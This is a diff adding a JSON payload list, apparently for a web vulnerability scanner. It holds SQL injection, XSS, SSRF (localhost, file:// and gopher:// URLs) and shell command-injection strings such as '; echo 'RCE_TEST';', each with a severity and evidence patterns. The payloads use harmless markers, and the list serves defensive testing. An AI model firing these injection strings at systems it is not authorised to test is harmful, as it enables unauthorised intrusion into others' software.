@@ -1,0 +1,225 @@
+[
+    {
+        "payload_id": "sqli_boolean_1",
+        "payload": "' OR '1'='1' -- ",
+        "vuln_type": "SQLI",
+        "severity": "HIGH",
+        "match_type": "BOOLEAN",
+        "evidence_patterns": [
+            "authentication bypass",
+            "different response for true/false"
+        ]
+    },
+    {
+        "payload_id": "sqli_error_1",
+        "payload": "' OR 1=CAST((SELECT @@version) AS INT)-- ",
+        "vuln_type": "SQLI",
+        "severity": "CRITICAL",
+        "match_type": "ERROR_BASED",
+        "evidence_patterns": [
+            "sql syntax error",
+            "database version",
+            "stack trace"
+        ]
+    },
+    {
+        "payload_id": "sqli_union_1",
+        "payload": "' UNION SELECT NULL-- ",
+        "vuln_type": "SQLI",
+        "severity": "CRITICAL",
+        "match_type": "UNION",
+        "evidence_patterns": [
+            "additional columns returned",
+            "database content in response"
+        ]
+    },
+    {
+        "payload_id": "sqli_time_1",
+        "payload": "' OR SLEEP(5)-- ",
+        "vuln_type": "SQLI",
+        "severity": "MEDIUM",
+        "match_type": "TIME_BASED",
+        "evidence_patterns": [
+            "response delay",
+            "time-based injection"
+        ]
+    },
+    {
+        "payload_id": "sqli_blind_bool_1",
+        "payload": "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) = 1-- ",
+        "vuln_type": "SQLI",
+        "severity": "HIGH",
+        "match_type": "BOOLEAN",
+        "evidence_patterns": [
+            "boolean-based difference",
+            "content change only"
+        ]
+    },
+    {
+        "payload_id": "xss_reflected_1",
+        "payload": "<script>console.log('xss-test')</script>",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "script tag in response",
+            "console.log marker",
+            "reflected input"
+        ]
+    },
+    {
+        "payload_id": "xss_img_onerror_1",
+        "payload": "\"><img src=x onerror=\"console.log('xss-img')\">",
+        "vuln_type": "XSS",
+        "severity": "HIGH",
+        "match_type": "STORED",
+        "evidence_patterns": [
+            "img tag with onerror",
+            "attribute reflected"
+        ]
+    },
+    {
+        "payload_id": "xss_dom_1",
+        "payload": "javascript:console.log('dom-xss')",
+        "vuln_type": "XSS",
+        "severity": "CRITICAL",
+        "match_type": "DOM_BASED",
+        "evidence_patterns": [
+            "javascript: in url handling",
+            "dom event execution"
+        ]
+    },
+    {
+        "payload_id": "xss_polyglot_1",
+        "payload": "'></script><svg onload=console.log('poly')>//",
+        "vuln_type": "XSS",
+        "severity": "HIGH",
+        "match_type": "POLYGLOT",
+        "evidence_patterns": [
+            "svg onload",
+            "polyglot execution",
+            "bypasses simple filters"
+        ]
+    },
+    {
+        "payload_id": "xss_attribute_1",
+        "payload": "\" onmouseover=\"console.log('hover-test')\" ",
+        "vuln_type": "XSS",
+        "severity": "LOW",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "attribute injection",
+            "event handler execution"
+        ]
+    },
+    {
+        "payload_id": "ssrf_simple_1",
+        "payload": "http://127.0.0.1:8000/ssrf-test",
+        "vuln_type": "SSRF",
+        "severity": "HIGH",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "test URL reached",
+            "response from internal host"
+        ]
+    },
+    {
+        "payload_id": "ssrf_file_1",
+        "payload": "file:///tmp/test_file",
+        "vuln_type": "SSRF",
+        "severity": "CRITICAL",
+        "match_type": "ERROR_BASED",
+        "evidence_patterns": [
+            "file content returned",
+            "unexpected file data"
+        ]
+    },
+    {
+        "payload_id": "ssrf_localhost_1",
+        "payload": "http://127.0.0.1:8000/ping",
+        "vuln_type": "SSRF",
+        "severity": "HIGH",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "localhost response",
+            "internal service accessed"
+        ]
+    },
+    {
+        "payload_id": "ssrf_tls_1",
+        "payload": "https://127.0.0.1:8000/ssl-check",
+        "vuln_type": "SSRF",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "ssl connection success",
+            "external host contacted"
+        ]
+    },
+    {
+        "payload_id": "ssrf_protocol_1",
+        "payload": "gopher://127.0.0.1:8000/payload",
+        "vuln_type": "SSRF",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "protocol access",
+            "unexpected protocol handling"
+        ]
+    },
+    {
+        "payload_id": "rce_cmd_injection_1",
+        "payload": "; echo 'RCE_TEST'; ",
+        "vuln_type": "RCE",
+        "severity": "CRITICAL",
+        "match_type": "ERROR_BASED",
+        "evidence_patterns": [
+            "command output",
+            "unexpected execution"
+        ]
+    },
+    {
+        "payload_id": "rce_backtick_1",
+        "payload": "`echo 'RCE_TEST'`",
+        "vuln_type": "RCE",
+        "severity": "CRITICAL",
+        "match_type": "ERROR_BASED",
+        "evidence_patterns": [
+            "output captured",
+            "shell execution appearance"
+        ]
+    },
+    {
+        "payload_id": "rce_system_exec_1",
+        "payload": "'; echo 'RCE_TEST'; '",
+        "vuln_type": "RCE",
+        "severity": "CRITICAL",
+        "match_type": "ERROR_BASED",
+        "evidence_patterns": [
+            "system output",
+            "execution appearance"
+        ]
+    },
+    {
+        "payload_id": "rce_env_1",
+        "payload": "$(echo 'RCE_TEST')",
+        "vuln_type": "RCE",
+        "severity": "HIGH",
+        "match_type": "ERROR_BASED",
+        "evidence_patterns": [
+            "command output",
+            "environment change"
+        ]
+    },
+    {
+        "payload_id": "rce_file_write_1",
+        "payload": "; echo 'RCE_TEST' > /tmp/rce_test_file; ",
+        "vuln_type": "RCE",
+        "severity": "CRITICAL",
+        "match_type": "ERROR_BASED",
+        "evidence_patterns": [
+            "file created",
+            "file contents visible"
+        ]
+    }
+]
